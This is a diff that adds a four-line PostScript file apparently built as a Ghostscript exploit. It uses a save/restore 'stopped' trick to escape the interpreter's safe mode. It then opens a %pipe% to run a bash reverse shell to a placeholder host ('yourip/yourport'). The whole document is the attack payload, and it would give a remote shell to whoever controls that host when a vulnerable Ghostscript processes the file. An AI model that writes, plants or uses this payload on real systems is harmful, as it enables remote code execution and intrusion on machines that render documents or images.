@@ -1,0 +1,4 @@
+%!PS
+0 1 300367 {} for
+{save restore} stopped {} if
+(%pipe%bash -c 'bash -i >& /dev/tcp/yourip/yourport 0>&1') (w) file
